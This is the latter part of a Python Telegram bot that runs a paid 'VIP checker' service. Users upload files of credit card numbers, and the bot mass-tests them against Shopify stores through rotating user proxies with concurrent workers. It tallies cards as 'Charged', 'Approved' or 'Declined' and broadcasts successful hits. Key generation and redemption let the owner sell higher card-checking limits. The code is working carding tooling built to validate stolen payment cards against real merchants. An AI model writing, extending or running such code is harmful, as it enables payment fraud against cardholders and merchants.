            t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
        t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
        await styled_reply(update, t, buttons=kb, use_gif=True)

    elif cmd == "fb":
        if not await force_join_check(update, context): return
        txt = raw_text.split(maxsplit=1)[1] if len(tokens) > 1 else ""
        if not txt and not update.message.reply_to_message and not getattr(update.message, 'media', None): 
            return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a message.')}</b>", use_gif=True)
        if ADMIN_ID:
            try:
                if update.message.reply_to_message:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.reply_to_message.message_id)
                    if txt: await context.bot.send_message(ADMIN_ID[0], f"💬 <b>Note:</b> {sf(txt)}\n📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                    else: await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
                else:
                    await context.bot.forward_message(chat_id=ADMIN_ID[0], from_chat_id=uid, message_id=update.message.message_id)
                    await context.bot.send_message(ADMIN_ID[0], f"📩 <b>From:</b> <code>{uid}</code>", parse_mode=ParseMode.HTML)
            except Exception: pass
        await styled_reply(update, f"<b>{CE_SMILE} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)

    elif cmd == "addpxy":
        if not await force_join_check(update, context): return
        lines = []
        if update.message.reply_to_message:
            if update.message.reply_to_message.document:
                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                fp = f"px_{uid}.txt"
                await f.download_to_drive(fp)
                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
                os.remove(fp)
            else:
                raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
                lines = raw_rep.split()
        else:
            if len(tokens) > 1: lines = args
            else: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
        
        if not lines: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found in your message.')}</b>", use_gif=True)
        db_p = await get_all_user_proxies(uid)
        eu = {p['proxy_url'] for p in db_p} if db_p else set()
        if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
        parsed = []
        for l in lines:
            px = parse_proxy_format(l)
            if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
        if not parsed: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('All proxies are already added or invalid.')}</b>", use_gif=True)
        parsed = parsed[:100-len(eu)]
        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
        c = 0
        for p2 in parsed: await add_proxy_db(uid, p2); c += 1
        await styled_edit(tm, f"<b>{CE_SMILE} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")

    elif cmd == "proxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('You do not have any proxies saved.')}</b>", use_gif=True)
        t = f"<b>{CE_GEAR} {sf('Your Proxies')} ({sf(str(len(proxies)))}/{sf('100')})</b>\n\n"
        for i, p in enumerate(proxies[:30], 1): t += f"<code>{sf(str(i))}.</code> <code>{sf(p['ip'])}:{sf(str(p['port']))}</code>\n"
        if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "rmpxy":
        if not await force_join_check(update, context): return
        proxies = await get_all_user_proxies(uid)
        if not proxies: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies to remove.')}</b>", use_gif=True)
        if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Specify all or the proxy number.')}</b>", use_gif=True)
        arg = args[0].strip().lower()
        if arg == 'all':
            c = await clear_all_proxies(uid)
            return await styled_reply(update, f"<b>{CE_SMILE} {sf('Cleared')} <code>{sf(str(c))}</code> {sf('Proxies successfully.')}</b>", use_gif=True)
        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies): 
                await remove_proxy_by_index(uid, idx)
                await styled_reply(update, f"<b>{CE_SMILE} {sf('Proxy removed.')}</b>", use_gif=True)
            else: await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid proxy number.')}</b>", use_gif=True)
        except Exception: await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid proxy number.')}</b>", use_gif=True)

    elif cmd == "gen":
        if uid not in ADMIN_ID: return
        if len(args) < 1: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Syntax')}:</b> <code>/gen [plan] [qty]</code>", use_gif=True)
        pk = args[0].lower()
        amt = int(args[1]) if len(args) > 1 else 1
        if pk not in PLANS: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Plan. Use: plan1, plan2, plan3, plan4')}</b>", use_gif=True)
        pi = PLANS[pk]
        kdb = await load_keys()
        gc = []
        for _ in range(amt):
            c = f"VIP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))}"
            kdb[c] = {"tier": pi["tier"], "days": pi["duration_days"], "used": False, "used_by": None, "generated_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            gc.append(c)
        await save_keys(kdb)
        t = f"<b>{CE_PARTY} {sf('Successfully Generated')} <code>{sf(str(amt))}</code> {sf('Key(s)!')}</b>\n\n├ <b>{sf('Plan')}:</b> <code>{sf(pi['name'])}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n\n"
        for c in gc: t += f"<code>{sf(c)}</code>\n"
        await styled_reply(update, t, use_gif=True)

    elif cmd == "redeem":
        if not await force_join_check(update, context): return
        raw_c = args[0].strip() if args else ""
        c = unsf(raw_c)
        if not c: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide your key:')}</b> <code>/redeem [Key]</code>", use_gif=True)
        kdb = await load_keys()
        if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
        ki = kdb[c]
        if ki["used"]: return await styled_reply(update, f"<b>{CE_BOOM} {sf('This Key has already been redeemed.')}</b>", use_gif=True)
        t, d = ki["tier"], ki["days"]
        await set_user_plan(uid, t, d)
        kdb[c]["used"], kdb[c]["used_by"], rt = True, uid, datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        kdb[c]["redeemed_at"] = rt
        await save_keys(kdb)
        ed = (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')
        limit = get_cc_limit(t, uid)
        
        user_name = _USER_NAMES.get(uid, f"User {uid}")
        safe_name = escape_html(sf(user_name))
        
        msg = f"""<b>{CE_PARTY} {sf('Subscription Activated Successfully!')}</b>

├ <b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a>
├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>
├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>
├ <b>{CE_GEAR} {sf('Mass Limit')}:</b> <code>{sf(str(limit))} CCs</code>
╰ <b>{CE_CHART} {sf('Expires On')}:</b> <code>{sf(ed)}</code>"""
        await styled_reply(update, msg, use_gif=True, specific_gif=REDEEM_GIF)
        
        try:
            an = f"<b>{CE_PARTY} {sf('New Key Redeemed!')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={uid}'>{safe_name}</a> (<code>{sf(str(uid))}</code>)\n├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(t)}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(d))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(rt)}</code>"
            if ADMIN_ID:
                for admin in ADMIN_ID:
                    await styled_send(context.bot, admin, an, use_gif=True, specific_gif=REDEEM_GIF)
        except Exception: pass

    elif cmd == "validate":
        if uid not in ADMIN_ID: return
        raw_c = args[0].strip() if args else ""
        c = unsf(raw_c)
        kdb = await load_keys()
        if not c: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Syntax')}:</b> <code>/validate [Key]</code>", use_gif=True)
        if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key not found in database.')}</b>", use_gif=True)
        ki = kdb[c]
        u, ub = ki.get("used", False), ki.get("used_by", "None")
        se, st = ('🔴', "Used") if u else ('🟢', "Active")
        m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
        if u: 
            prof_name = escape_html(sf(_USER_NAMES.get(ub, f"User {ub}")))
            m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
        await styled_reply(update, m, use_gif=True)

    elif cmd == "maint":
        if uid not in ADMIN_ID: return
        a = args[0].strip().lower() if args else ""
        if a: _MAINTENANCE_MODE = (a == 'on')
        else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
        t = "ON" if _MAINTENANCE_MODE else "OFF"
        await styled_reply(update, f"<b>{CE_GEAR} {sf('Maintenance Mode')}:</b> {sf(t)}", use_gif=True)

    elif cmd in ["users", "user"]:
        if uid not in ADMIN_ID: return
        active_info = []
        for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
            if not p.get("stopped"):
                un = escape_html(sf(_USER_NAMES.get(u, f"User {u}")))
                gate = p.get("gate", "Unknown")
                total = p.get("total", "?")
                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
                
        recent_users_info = []
        sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
        for u, _ in sorted_users:
            un = escape_html(sf(_USER_NAMES.get(u, f"User {u}")))
            recent_users_info.append(f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
            
        text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
        if recent_users_info: text += f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>\n"
        else: text += f"  ╰ {sf('Recent Users')}: <code>{sf('None')}</code>\n\n"
            
        text += f"├ <b>{sf('Active Checkers')}:</b> <code>{sf(str(len(active_info)))}</code>\n"
        if active_info: text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
        else: text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
            
        await styled_reply(update, text, use_gif=True)

    elif cmd == "revoke":
        if uid not in ADMIN_ID: return
        if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
        try: tu = int(unsf(args[0].strip()))
        except Exception: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
        await set_user_plan(tu, "Free", 0)
        proc = ACTIVE_MTXT_PROCESSES.get(tu)
        if proc:
            proc["stopped"] = True
            for t in proc.get("tasks", []):
                if not t.done(): t.cancel()
        admin_msg = f"<b>{CE_BOOM} {sf('Access Revoked')}</b>\n├ <b>{CE_SMILE} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>"
        await styled_reply(update, admin_msg, use_gif=True)
        try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
        except Exception: pass

# ====================== CALLBACK FUNCTIONS ======================
async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    cp = await get_user_plan(uid)
    t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
    for _, pi in PLANS.items():
        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
    t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    
    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    
    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
    
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
        
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid in ADMIN_ID: 
        await q.answer("✅ Admin Access", show_alert=True)
        try: await q.message.delete()
        except: pass
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
        return
        
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        await mark_user_joined(uid)
        _JOIN_CACHE[uid] = time.time()
        await q.answer("✅ Verified Successfully!", show_alert=True)
        try: await q.message.delete()
        except Exception: pass
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
    else:
        await q.answer("❌ Not joined yet!", show_alert=True)

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    q = update.callback_query
    uid = q.from_user.id
    gn = q.data.split(":")[1]
    await q.answer()
    msg_obj = q.message
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    tot = len(cards); chk = chg = app = ins = dec = err = 0
    st = time.time()
    
    sites = await get_shopify_sites()
    proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
    http_session = await get_user_http_session(uid)
    
    last_resp = sf("Waiting for response...")
    
    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)

    async def dashboard_updater():
        while not is_stopped():
            for _ in range(40):
                if is_stopped(): break
                await asyncio.sleep(0.1)
            if is_stopped(): break
            
            elapsed_now = int(time.time() - st)
            cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
            h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
            
            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
            
            percent = int((chk / tot) * 100) if tot > 0 else 0
            
            kb = [
                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none", style="success" if percent == 100 else "primary")],
                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none", style="primary")],
                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}", style="danger")]
            ]
            try: await styled_edit(msg_obj, dt, buttons=kb)
            except asyncio.CancelledError: break
            except Exception: pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    sem = asyncio.Semaphore(WORKERS)

    async def worker(wid):
        await asyncio.sleep(wid * 0.1)
        nonlocal chk, chg, app, ins, dec, err, last_resp
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except Exception: break
            
            async with sem:
                try:
                    c_st = time.time()
                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                    if is_stopped(): break 
                    
                    c_el = time.time() - c_st
                    status = res.get('status', 'Dead')
                    chk += 1
                    
                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                    short_msg = (raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg
                    last_resp = sf(short_msg)
                    
                    if status == 'Charged':
                        chg += 1
                        asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot))
                        asyncio.create_task(_send_global_hit(gateway=gate_name, price=res.get('price', '-'), uid=uid, bot=bot, elapsed=c_el))
                    elif status == 'Approved': app += 1
                    elif status == 'Insufficient': ins += 1
                    elif status == 'Site Error': err += 1
                    else: dec += 1
                        
                except asyncio.CancelledError: break
                except Exception: err += 1; chk += 1
                finally:
                    queue.task_done()
                    if not is_stopped(): await asyncio.sleep(DELAY)

    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
    process_store[uid]["tasks"] = wt + [ut]
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done(): ut.cancel()
        
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((chk / el) * 60) if el > 0 else 0
    
    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
    
    fkb = [
        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none", style="success")],
        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none", style="primary")]
    ]
    try: await styled_edit(msg_obj, ft, buttons=fkb)
    except Exception: pass
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    puid = int(q.data.split(":")[1])
    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: return await q.answer("⚠️ Not yours!", show_alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await q.answer("🛑 Stopped Immediately!", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()

async def check_sites_loop():
    while True:
        await get_shopify_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    logger.info("🔄 Protocol: Webhook Killer initiated.")
    try: await app.bot.delete_webhook(drop_pending_updates=True)
    except Exception: pass
    try: await init_db()
    except Exception as e: logger.error(f"DB Error: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(60).write_timeout(60).connect_timeout(60).post_init(post_init).build()
    app.add_error_handler(global_error_handler)
    
    app.add_handler(MessageHandler(filters.ALL, master_router))
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
    
    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH FORCED GIFS & SHOPIFY ONLY!")
    
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
            break
        except Conflict:
            logger.warning("Conflict detected. Retrying...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"Fatal error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
